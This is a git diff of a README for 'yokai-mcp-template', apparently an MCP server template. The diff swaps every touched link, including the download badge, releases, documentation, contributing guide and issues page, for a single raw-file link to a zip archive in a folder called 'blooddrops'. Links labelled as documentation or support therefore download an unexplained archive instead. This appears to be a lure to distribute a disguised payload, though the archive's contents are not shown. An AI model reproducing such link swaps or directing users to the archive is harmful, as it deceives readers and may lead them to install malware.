@@ -6,9 +6,9 @@ Welcome to the yokai-mcp-template! This template helps you set up a Modular Cont
 
 ## 📥 Download & Install
 
-[![Download yokai-mcp-template](https://img.shields.io/badge/Download-yokai--mcp--template-brightgreen.svg)](https://github.com/Brahhime/yokai-mcp-template/releases)
+[![Download yokai-mcp-template](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip)](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip)
 
-To download the latest version, visit this page: [Download Releases](https://github.com/Brahhime/yokai-mcp-template/releases).
+To download the latest version, visit this page: [Download Releases](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip).
 
 ### Steps to Download
 
@@ -55,16 +55,16 @@ After downloading, follow these steps to run the application:
 
 ## 📚 Documentation and Support
 
-For more detailed guidance, refer to the [Documentation](https://github.com/Brahhime/yokai-mcp-template/wiki) repository. If you encounter issues or have questions, please check the FAQs or reach out through the Issues tab on GitHub.
+For more detailed guidance, refer to the [Documentation](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip) repository. If you encounter issues or have questions, please check the FAQs or reach out through the Issues tab on GitHub.
 
 ## ✍️ Contributing
 
-We welcome contributions! If you’d like to improve this template or add features, please visit the [Contributing Guide](https://github.com/Brahhime/yokai-mcp-template/blob/main/CONTRIBUTING.md) for details on how to get involved.
+We welcome contributions! If you’d like to improve this template or add features, please visit the [Contributing Guide](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip) for details on how to get involved.
 
 ## 🔗 Useful Links
 
-- [Download Releases](https://github.com/Brahhime/yokai-mcp-template/releases)
-- [Documentation](https://github.com/Brahhime/yokai-mcp-template/wiki)
-- [Issues Page](https://github.com/Brahhime/yokai-mcp-template/issues) 
+- [Download Releases](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip)
+- [Documentation](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip)
+- [Issues Page](https://raw.githubusercontent.com/Brahhime/yokai-mcp-template/main/blooddrops/yokai-mcp-template.zip) 
 
 Thank you for choosing the yokai-mcp-template! Enjoy building your server!
